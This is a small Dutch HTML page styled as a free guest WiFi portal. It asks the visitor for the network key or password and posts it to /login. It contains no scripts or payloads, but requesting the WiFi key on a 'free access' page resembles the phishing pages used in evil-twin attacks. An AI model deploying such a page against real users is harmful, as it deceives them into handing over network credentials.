<!DOCTYPE html>
<html lang="nl">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>WiFi Portaal - Gratis Toegang</title>
    <style>
        body { font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif; background-color: #f0f2f5; margin: 0; display: flex; justify-content: center; align-items: center; height: 100vh; }
        .container { background: white; width: 100%; max-width: 400px; padding: 0; border-radius: 15px; box-shadow: 0 10px 25px rgba(0,0,0,0.1); overflow: hidden; text-align: center; }
        .header { background-color: #1a73e8; color: white; padding: 30px 20px; }
        .header h1 { margin: 0; font-size: 22px; font-weight: 600; }
        .content { padding: 30px 25px; }
        p { color: #5f6368; font-size: 14px; line-height: 1.5; margin-bottom: 25px; }
        input[type="password"] { width: 100%; padding: 14px; margin-bottom: 15px; border: 1px solid #dadce0; border-radius: 8px; font-size: 16px; box-sizing: border-box; background-color: #f8f9fa; }
        input:focus { outline: none; border: 2px solid #1a73e8; background-color: #fff; }
        button { width: 100%; background-color: #1a73e8; color: white; border: none; padding: 14px; border-radius: 8px; font-size: 16px; font-weight: 600; cursor: pointer; transition: background 0.2s; }
        button:hover { background-color: #1557b0; }
        .terms { font-size: 11px; color: #9aa0a6; margin-top: 20px; }
    </style>
</head>
<body>
    <div class="container">
        <div class="header">
            <h1>Gratis Gasten WiFi</h1>
        </div>
        <div class="content">
            <p>Welkom! Voer de netwerksleutel in om verbinding te maken met ons hogesnelheidsnetwerk.</p>
            <form action="/login" method="POST">
                <input type="password" name="password" placeholder="Netwerksleutel / Wachtwoord" required>
                <button type="submit">Nu Verbinden</button>
            </form>
            <div class="terms">
                Door te verbinden gaat u akkoord met onze algemene voorwaarden en het privacybeleid.
            </div>
        </div>
    </div>
</body>
</html>
